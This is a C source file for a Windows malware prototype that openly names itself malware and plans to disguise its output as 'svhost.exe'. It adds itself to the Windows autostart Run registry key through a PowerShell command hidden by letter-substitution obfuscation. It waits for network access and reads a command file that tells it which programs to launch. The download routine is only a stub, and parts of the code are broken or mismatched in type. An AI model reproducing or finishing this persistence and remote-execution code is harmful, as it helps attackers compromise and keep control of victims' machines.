#pragma comment( lib, "ws2_32.lib" ) //Winsock Library
#pragma comment( lib, "wininet.lib" ) //Windows Internet Library

#include <stdio.h>
#include <WinSock2.h>
#include <Windows.h>
#include <WinInet.h>
#include <wchar.h>
#include <process.h>

//Own Includes
#include "Sensless.h"
#include "..\..\Obfuscator\Obfuscator\Obfuscator.h"

#define CMD_MODE 0
#define PARAM_MODE 1

#define BUFSIZE 80

typedef struct {
	wchar_t *value;
	size_t length;
	size_t size;
} String;

/*typedef struct {
	char command;
	String *param1;
	String *param2;
} Command;*/

//Functions
int start();
int wait_for_internet();
char update();

void autostart();

//Function Dict
int download(wchar_t sourcePath, wchar_t localFolderPath);
int execute(wchar_t *path, wchar_t *arguments);

//Parse functions
int scan(char filePath[]);
int parse(String *line);
String parameter(String *line, int *pos);
int interpret(char cmd, String param1, String param2);

//String functions
void appendString(String *str, char element);
void initString(String *str);
void freeString(String *str);

//Debug functions
void debugw(wchar_t *message);
void debug(char *message );
void debugc(char *message, char chr);
void debugd(char *message, int num);
void errorPars(char *str);

//Global variable indicates if the DEBUG MODE is on!
int debugMode = FALSE;

wchar_t *ownPath;

char * lastDownloaded = "";

/**
 * TODO Rename the malware output to svhost.exe in ReleaseSvhost
 *
 * String source: http://stackoverflow.com/questions/3536153/c-dynamically-growing-array
 */
int main(int argc, char *argv[]) {
	if (argc == 2) {
		if (0 == strcmp("debug", argv[1])) {
			debugMode = TRUE;
			debug("DEBUG MODE ON!");
		}
	}

	wchar_t buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	ownPath = buffer;

	debug("ownPath:");
	debugw(ownPath);

	return start();
}

int start() {
	autostart();
	wait_for_internet();

	char filePath[] = "main.txt";
	scan(filePath);

	return 0;
}

//wait for internet connection, if there is one an internet connection
//the the function returns immidiatly
int wait_for_internet() {
	//START: SENSLESS
	ms95();
	//END: SENSLESS

	int sleepBetweenQueriesInMS = 10000; // value/1000 seconds
	LPDWORD connectionDescription = FALSE;

	int isActive = FALSE;
	isActive = InternetGetConnectedState(connectionDescription, 0);

	while (FALSE == isActive) {
		debug("No internet connection!");
		
		Sleep(sleepBetweenQueriesInMS);
		isActive = InternetGetConnectedState(connectionDescription, 0);
	}

	debug("Internet connection established!");

	return 0;
}

char update() {
	char * file; 
	file = NULL;

	// the \ symbole must be escaped with two \\ slashes, the output result is C:\ as path
	file = download( L"C:\\Users\\user\\Documents\\malware\\Malware\\Malware\\Malware\\main_2.txt", L"C:\\" );

	return 'c';
}

int scan( char filePath[] ) {
	int ret = FALSE;

	FILE *fptr;
	fptr = fopen(filePath, "r");

	if (NULL != fptr) {
		debug("File opend successfuly!");

		String line;
		initString(&line);

		//read first char
		char curr = fgetc(fptr);

		while (EOF != curr) {
			if ( '\n' == curr || '\r' == curr ) {
				debug("newline");
				parse(&line);
				freeString(&line);
				initString(&line);
			}
			else {
				appendString(&line, curr);
			}
			curr = fgetc(fptr);
		}

		parse(&line);
		freeString(&line);

		ret = TRUE;
	}

	return ret;
}

int parse(String *line) {
	int i = 0;
	if (isalpha(line->value[i])) {
		char cmd = line->value[i];

		i++;
		if (':' == line->value[i]) {
			i++;
			if ('\"' == line->value[i]) {
				i++;

				int *pos = i;
				String param1 = parameter(line, &pos);
				i = pos;
				i++;

				if (',' == line->value[i] && '\"' == line->value[(++i)]) {
					i++;
					int *pos2 = i;
					String param2 = parameter(line, &pos2);
					i = pos2;
					i++;

					if (';' == line->value[i]) {
						debug("parsing successful!");
						interpret(cmd, param1, param2);
					}
				}
				else {
					errorPars("second parameter is missing!");
				}
			}
			else {
				errorPars("parameterlist wrong start symbol!");
			}
		}
		else {
			errorPars("no ':' colon after command!");
		}
	} else {
		errorPars("not a command!");
	}

	return 0;
}


String parameter(String *line, int *pos) {
	String param;
	initString(&param);

	int b = *pos;

	while ('\"' != line->value[b]) {
		appendString(&param, line->value[b]);
		b++;
	}	

	*pos = b;

	return param;
}

int interpret(char cmd, String param1, String param2) {
	debug("f: interpret");
	switch (cmd) {
		case 'e':
			execute(param1.value, param2.value);
			break;
		default:
			debug("Command not available!");
			break;
	}

	return 0;
}

void errorPars( char *str ) {
	char msg[200] = { '\0' };
	sprintf( msg, "\n*** ERROR: %s\n", str);
	debug(msg);
}

int download( char *sourcePath, char *localFolderPath ) {
	debug("f: download");
	debug("src: %s", sourcePath);
	debug("dst: %s", localFolderPath);

	return 0;
}

void autostart() {
	//System trick works perfectly
	debug("f: autostart");
	wchar_t cmd[1000];

	//compilation error -> compiler make it to const value -> fixed with this approach
	//original value: "Powershell.exe Set-Item -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Value \"%ls\"" 
	char str[] = "Cbjrefuryy.rkr Frg#Vgrz #Cngu UXPH*§§Fbsgjner§§Zvpebfbsg§§Jvaqbjf§§PheeragIrefvba§§Eha #Inyhr \"%yf\"";
	sprintf(cmd, obfuscate( str ), ownPath);

	debug(cmd);

	int result = system( cmd );
	if (0 == result) {
		debug("Registry entry successful written!" );
	}
	else {
		debug("Registry entry write error!");
	}
}

/**
 * Create a independent process
 *
 * Source: http://faq.cprogramming.com/cgi-bin/smartfaq.cgi?id=1043284392&answer=1044654269
 */
//Does not work
int execute( wchar_t *path, wchar_t *arguments ) {
	debug("f: execute");
	debug("path:");
	debugw(path);
	debug("args:");
	debugw(arguments);

	//wchar_t path[] = L"C:\Windows\System32\calc.exe";

	PROCESS_INFORMATION pif;
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	//It works with ownPath -> #define CreateProcess CreateProcessW!
	//The application has to be in unicode
	int bRet = CreateProcess(
		path,
		arguments,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pif
	);

	if (0 != bRet) {
		debug("Program started!");
	}
	else {
		debug("Unable to start the program!");
		debugd("error code:", bRet);
		debugd("error code:", GetLastError());
	}

	CloseHandle(pif.hProcess);
	CloseHandle(pif.hThread);

	return 0;
}
int regular_expression( char regexp[] ) {
	int ret = FALSE;

	return ret;
}


void debugw(wchar_t *message) {
	if (TRUE == debugMode) {
		char *prefix = "debug";

		printf("%s: %ls\n", prefix, message);
	}
}

void debug(char *message) {
	if (TRUE == debugMode) {
		char *prefix = "debug";

		printf("%s: %s\n", prefix, message);
	}
}
void debugc(char *message, char *chr) {
	if (TRUE == debugMode) {
		char *prefix = "debug";

		printf("%s: %s %c\n", prefix, message, chr);
	}
}
void debugd(char *message, int num) {
	if (TRUE == debugMode) {
		char *prefix = "debug";

		printf("%s: %s %d\n", prefix, message, num);
	}
}

void initString( String *str ) {
	size_t initialSize = 10;
	str->value = (char *)malloc(initialSize * sizeof(wchar_t));
	str->length = 0;
	str->size = initialSize;
}

void appendString(String *str, char element) {
	if (str->length == (str->size - 1)) {
		str->size += 10;
		str->value = (char *)realloc(str->value, str->size * sizeof(wchar_t));
	}
	str->value[str->length++] = element;
	str->value[str->length + 1] = '\0';
}

void freeString(String *str) {
	free(str->value);
	str->value = NULL;
	str->length = 0;
	str->size = 0;
}
